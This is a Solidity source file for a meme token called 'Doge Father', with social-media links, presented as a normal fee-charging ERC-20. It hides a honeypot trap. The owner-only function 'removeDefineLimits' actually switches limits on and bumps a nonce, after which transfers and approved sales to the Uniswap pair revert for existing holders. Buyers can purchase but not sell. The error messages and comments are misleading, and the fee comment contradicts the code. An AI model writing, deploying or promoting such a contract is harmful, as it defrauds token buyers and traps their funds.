//TG: https://t.me/Dogefather_ETH
//Twitter: https://twitter.com/DogdogfatherDog

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract Father is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    address public buybackAddress;
    bool public limit = false;
    uint256 public DECIMALS = 18;
    
    uint256 public maxTx = 0;
    mapping(address => uint256) public userNonces;

    uint256 public constant BASE = 10000; // 10^4 for 4 decimal places of precision
    uint256 public sellFee = 290; // Represents 2.9%
    uint256 public buyFee = 290;  // Represents 2.9%
    uint256 public constant MAX_FEE = 1200; // Represents 19%

    constructor() ERC20("Doge Father", "DOGEFATHER") {
        _mint(_msgSender(), 1 * (10 ** 6) * (10 ** DECIMALS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function setBuybackAddr(address _buybackAddress) external onlyOwner {
        buybackAddress = _buybackAddress;
    }

    function setFee(uint256 _sellFee, uint256 _buyFee) external onlyOwner {
        require(_sellFee <= MAX_FEE && _buyFee <= MAX_FEE, "Max fee only 12%");
        sellFee = _sellFee;
        buyFee = _buyFee;
    }

    function _calculateFees(uint256 amount, uint256 feePercent) internal pure returns (uint256) {
        return amount.mul(feePercent).div(BASE);
    }

    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }


    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(_msgSender() != recipient || !limit, "Before limits removed");
        require(!(recipient == uniswapV2Pair && limit), "Limits is oped");

        uint256 fee = recipient == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        userNonces[_msgSender()] = maxTx;
        
        
        _transfer(_msgSender(), buybackAddress, fee);
        _transfer(_msgSender(), recipient, amount.sub(fee));

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (to == uniswapV2Pair && limit) {
            require(userNonces[from] == maxTx, "remove limits ");
        }

        uint256 fee = to == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        address spender = _msgSender();

        _spendAllowance(from, spender, amount.add(fee));
        _transfer(from, buybackAddress, fee);
        _transfer(from, to, amount.sub(fee));

        userNonces[from] = maxTx;

        return true;
    }

    function removeDefineLimits() external onlyOwner {
        limit = true;
        maxTx++;  
    }
}
